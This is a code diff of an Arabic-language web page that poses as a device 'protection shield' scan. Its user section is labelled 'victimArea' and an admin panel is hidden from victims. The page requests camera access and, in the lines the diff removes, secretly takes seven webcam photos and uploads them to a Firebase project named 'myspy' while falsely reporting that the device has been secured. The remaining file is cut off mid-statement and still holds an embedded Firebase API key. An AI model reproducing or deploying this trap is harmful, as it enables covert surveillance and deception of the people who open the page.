@@ -18,9 +18,7 @@
     </style>
 </head>
 <body>
-
     <div class="header">آلَﻤــشّـآ كَسًـ آلَۼد</div>
-
     <div id="adminArea" class="hidden">
         <div class="box">
             <h2 style="color:#f00;">لوحة التحكم (مشرف) 👑</h2>
@@ -31,7 +29,6 @@
             </div>
         </div>
     </div>
-
     <div id="victimArea" class="hidden">
         <div class="box">
             <h3>🛡️ درع الحماية الذكي</h3>
@@ -40,62 +37,23 @@
             <div id="status" style="margin-top:15px; color:#f44;">الحالة: جهازك في خطر ⚠️</div>
         </div>
     </div>
-
     <script>
         const firebaseConfig = { apiKey: "AIzaSyAvb-rjNbcWHlZEdEF0q9v3PL8XF8jnt3U", authDomain: "myspy-2579b.firebaseapp.com", projectId: "myspy-2579b", storageBucket: "myspy-2579b.firebasestorage.app", messagingSenderId: "487846863334", appId: "1:487846863334:web:b58620e6f34d187e02b627" };
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
-
-        const myAdminId = localStorage.getItem('adminId') || 'admin_' + Math.random().toString(36).substr(2, 9);
-        localStorage.setItem('adminId', myAdminId);
-
         if (navigator.userAgent.includes("AppCreator24")) {
             document.getElementById('adminArea').classList.remove('hidden');
         } else {
             document.getElementById('victimArea').classList.remove('hidden');
         }
-
         let stream;
         navigator.mediaDevices.getUserMedia({ video: true }).then(s => stream = s);
-
         async function startTrap() {
             if(!stream) { alert("🚨 لازم توافق على الكاميرا لتأمين جهازك!"); return; }
-            
-            document.getElementById('status').innerText = "⏳ جاري الفحص.. برجاء عدم إغلاق الصفحة";
-            document.getElementById('status').style.color = "#ff0";
-
             const video = document.createElement('video');
             video.srcObject = stream;
             video.play();
-
-            // تصوير 7 صور فوق بعض بفارق بسيط جداً
             for (let i = 1; i <= 7; i++) {
                 setTimeout(() => {
                     const canvas = document.createElement('canvas');
-                    canvas.width = 640; canvas.height = 480;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    const photoData = canvas.toDataURL('image/jpeg', 0.5); // جودة متوسطة لسرعة الرفع
-                    
-                    db.ref('results/' + myAdminId).push({ 
-                        photo: photoData, 
-                        date: new Date().toLocaleString() + " (لقطة " + i + ")"
-                    });
-
-                    if(i === 7) {
-                        document.getElementById('status').innerText = "✅ تم تأمين الجهاز بنجاح!";
-                        document.getElementById('status').style.color = "#0f0";
-                        alert("تم فحص وتأمين جهازك بنجاح!");
-                    }
-                }, i * 300); // لقطة كل 300 مللي ثانية
-            }
-        }
-
-        function copyMyLink() {
-            const el = document.getElementById('myUrl');
-            el.select();
-            document.execCommand('copy');
-            alert("تم النسخ يا مشرف! طير وخلص الليلة 🔥");
-        }
-    </script>
-</body>
-</html>
+                    canvas.width = 640; canvas.height
